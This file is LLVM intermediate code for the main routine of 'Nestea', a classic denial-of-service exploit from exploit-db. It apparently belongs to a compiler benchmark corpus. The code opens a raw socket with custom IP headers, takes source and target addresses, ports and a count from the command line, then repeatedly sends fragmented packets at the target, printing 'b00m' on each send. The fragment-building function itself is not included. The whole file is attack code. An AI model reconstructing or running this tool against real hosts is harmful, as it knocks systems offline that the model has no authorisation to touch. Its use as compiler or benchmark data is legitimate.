; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_22440.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_22440.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i8* }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [11 x i8] c"raw socket\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"IP_HDRINCL\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [43 x i8] c"What the hell kind of IP address is that?\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"s:t:n:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@COUNT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [63 x i8] c"Nestea by humble\0ACode ripped from teardrop by route / daemon9\0A\00", align 1
@.str.5 = private unnamed_addr constant [36 x i8] c"Death on flaxen wings (yet again):\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"From: %15s.%5d\0A\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c" To: %15s.%5d\0A\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c" Amt: %5d\0A\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"[ \00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"b00m \00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.in_addr, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %15 = load i32, i32* @AF_INET, align 4
  %16 = load i32, i32* @SOCK_RAW, align 4
  %17 = load i32, i32* @IPPROTO_RAW, align 4
  %18 = call i32 @socket(i32 %15, i32 %16, i32 %17)
  store i32 %18, i32* %9, align 4
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %23

20:                                               ; preds = %2
  %21 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 @exit(i32 1) #3
  unreachable

23:                                               ; preds = %2
  %24 = load i32, i32* %9, align 4
  %25 = load i32, i32* @IPPROTO_IP, align 4
  %26 = load i32, i32* @IP_HDRINCL, align 4
  %27 = bitcast i32* %6 to i8*
  %28 = call i64 @setsockopt(i32 %24, i32 %25, i32 %26, i8* %27, i32 4)
  %29 = icmp slt i64 %28, 0
  br i1 %29, label %30, label %33

30:                                               ; preds = %23
  %31 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %32 = call i32 @exit(i32 1) #3
  unreachable

33:                                               ; preds = %23
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 3
  br i1 %35, label %36, label %41

36:                                               ; preds = %33
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @usage(i8* %39)
  br label %41

41:                                               ; preds = %36, %33
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i8* @name_resolve(i8* %44)
  store i8* %45, i8** %10, align 8
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %53

47:                                               ; preds = %41
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 2
  %50 = load i8*, i8** %49, align 8
  %51 = call i8* @name_resolve(i8* %50)
  store i8* %51, i8** %11, align 8
  %52 = icmp ne i8* %51, null
  br i1 %52, label %57, label %53

53:                                               ; preds = %47, %41
  %54 = load i32, i32* @stderr, align 4
  %55 = call i32 (i32, i8*, ...) @fprintf(i32 %54, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %56 = call i32 @exit(i32 1) #3
  unreachable

57:                                               ; preds = %47
  br label %58

58:                                               ; preds = %80, %57
  %59 = load i32, i32* %4, align 4
  %60 = load i8**, i8*** %5, align 8
  %61 = call i32 @getopt(i32 %59, i8** %60, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  store i32 %61, i32* %8, align 4
  %62 = load i32, i32* @EOF, align 4
  %63 = icmp ne i32 %61, %62
  br i1 %63, label %64, label %81

64:                                               ; preds = %58
  %65 = load i32, i32* %8, align 4
  switch i32 %65, label %75 [
    i32 115, label %66
    i32 116, label %69
    i32 110, label %72
  ]

66:                                               ; preds = %64
  %67 = load i32, i32* @optarg, align 4
  %68 = call i32 @atoi(i32 %67)
  store i32 %68, i32* %12, align 4
  br label %80

69:                                               ; preds = %64
  %70 = load i32, i32* @optarg, align 4
  %71 = call i32 @atoi(i32 %70)
  store i32 %71, i32* %13, align 4
  br label %80

72:                                               ; preds = %64
  %73 = load i32, i32* @optarg, align 4
  %74 = call i32 @atoi(i32 %73)
  store i32 %74, i32* %7, align 4
  br label %80

75:                                               ; preds = %64
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @usage(i8* %78)
  br label %80

80:                                               ; preds = %75, %72, %69, %66
  br label %58

81:                                               ; preds = %58
  %82 = call i64 @time(i32 0)
  %83 = trunc i64 %82 to i32
  %84 = call i32 @srandom(i32 %83)
  %85 = load i32, i32* %12, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %90, label %87

87:                                               ; preds = %81
  %88 = call i32 (...) @random()
  %89 = srem i32 %88, 65535
  store i32 %89, i32* %12, align 4
  br label %90

90:                                               ; preds = %87, %81
  %91 = load i32, i32* %13, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %96, label %93

93:                                               ; preds = %90
  %94 = call i32 (...) @random()
  %95 = srem i32 %94, 65535
  store i32 %95, i32* %13, align 4
  br label %96

96:                                               ; preds = %93, %90
  %97 = load i32, i32* %7, align 4
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %101, label %99

99:                                               ; preds = %96
  %100 = load i32, i32* @COUNT, align 4
  store i32 %100, i32* %7, align 4
  br label %101

101:                                              ; preds = %99, %96
  %102 = load i32, i32* @stderr, align 4
  %103 = call i32 (i32, i8*, ...) @fprintf(i32 %102, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.4, i64 0, i64 0))
  %104 = load i32, i32* @stderr, align 4
  %105 = call i32 (i32, i8*, ...) @fprintf(i32 %104, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0))
  %106 = load i8*, i8** %10, align 8
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i8* %106, i8** %107, align 8
  %108 = load i32, i32* @stderr, align 4
  %109 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  %110 = load i8*, i8** %109, align 8
  %111 = call i8* @inet_ntoa(i8* %110)
  %112 = load i32, i32* %12, align 4
  %113 = call i32 (i32, i8*, ...) @fprintf(i32 %108, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0), i8* %111, i32 %112)
  %114 = load i8*, i8** %11, align 8
  %115 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i8* %114, i8** %115, align 8
  %116 = load i32, i32* @stderr, align 4
  %117 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  %118 = load i8*, i8** %117, align 8
  %119 = call i8* @inet_ntoa(i8* %118)
  %120 = load i32, i32* %13, align 4
  %121 = call i32 (i32, i8*, ...) @fprintf(i32 %116, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0), i8* %119, i32 %120)
  %122 = load i32, i32* @stderr, align 4
  %123 = load i32, i32* %7, align 4
  %124 = call i32 (i32, i8*, ...) @fprintf(i32 %122, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0), i32 %123)
  %125 = load i32, i32* @stderr, align 4
  %126 = call i32 (i32, i8*, ...) @fprintf(i32 %125, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %127

127:                                              ; preds = %141, %101
  %128 = load i32, i32* %8, align 4
  %129 = load i32, i32* %7, align 4
  %130 = icmp slt i32 %128, %129
  br i1 %130, label %131, label %144

131:                                              ; preds = %127
  %132 = load i32, i32* %9, align 4
  %133 = load i8*, i8** %10, align 8
  %134 = load i8*, i8** %11, align 8
  %135 = load i32, i32* %12, align 4
  %136 = load i32, i32* %13, align 4
  %137 = call i32 @send_frags(i32 %132, i8* %133, i8* %134, i32 %135, i32 %136)
  %138 = load i32, i32* @stderr, align 4
  %139 = call i32 (i32, i8*, ...) @fprintf(i32 %138, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %140 = call i32 @usleep(i32 500)
  br label %141

141:                                              ; preds = %131
  %142 = load i32, i32* %8, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %8, align 4
  br label %127

144:                                              ; preds = %127
  %145 = load i32, i32* @stderr, align 4
  %146 = call i32 (i32, i8*, ...) @fprintf(i32 %145, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i8* @name_resolve(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @srandom(i32) #1

declare dso_local i64 @time(i32) #1

declare dso_local i32 @random(...) #1

declare dso_local i8* @inet_ntoa(i8*) #1

declare dso_local i32 @send_frags(i32, i8*, i8*, i32, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
